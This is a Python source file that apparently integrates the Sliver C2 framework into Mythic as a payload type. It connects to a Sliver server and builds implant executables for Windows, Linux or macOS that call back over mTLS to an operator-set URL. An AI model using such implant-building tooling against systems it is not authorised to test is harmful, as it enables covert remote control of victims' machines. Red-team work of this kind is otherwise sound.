import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from sliver import SliverClientConfig, SliverClient, client_pb2


class SliverImplant(PayloadType):
    name = "sliverimplant"
    author = "Spencer Adolph"
    note = """This payload connects to sliver to interact with a specific implant."""
    supported_os = [SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS]
    file_extension = ""
    wrapper = False
    wrapped_payloads = []
    supports_dynamic_loading = False
    c2_profiles = []
    mythic_encrypts = False
    translation_container = None # "myPythonTranslation"
    # agent_type = ""
    agent_path = pathlib.Path(".") / "sliverimplant"
    agent_icon_path = agent_path / "agent_functions" / "sliver.svg"
    agent_code_path = agent_path / "agent_code"
    build_steps = []
    build_parameters = [
        BuildParameter(
            name="sliverconfig_file_uuid",
            description="sliverconfig_file_uuid",
            parameter_type=BuildParameterType.String,
        ),
        BuildParameter(
            name="os",
            description="os",
            parameter_type=BuildParameterType.String,
        ),
        BuildParameter(
            name="mtls",
            description="mtls",
            parameter_type=BuildParameterType.String,
        ),
    ]

    async def build(self) -> BuildResponse:
        os = self.get_parameter('os')
        mtls = self.get_parameter('mtls')
        sliverconfig_file_uuid = self.get_parameter('sliverconfig_file_uuid')

        if (os == ''):
            return BuildResponse(status=BuildStatus.Success)
        
        filecontent = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=sliverconfig_file_uuid
        ))
        config = SliverClientConfig.parse_config(filecontent.Content)
        client = SliverClient(config)
        await client.connect()

        implant_config = client_pb2.ImplantConfig(
            IsBeacon=False,
            Name=f"{self.uuid}",
            GOARCH="amd64",
            GOOS=os,
            Format=client_pb2.OutputFormat.EXECUTABLE,
            ObfuscateSymbols=False,
            C2=[client_pb2.ImplantC2(Priority=0, URL=f"{mtls}")],
        )

        implant = await client.generate_implant(implant_config)
        implant_bytes = implant.File.Data

        resp = BuildResponse(status=BuildStatus.Success, payload=implant_bytes)
        return resp
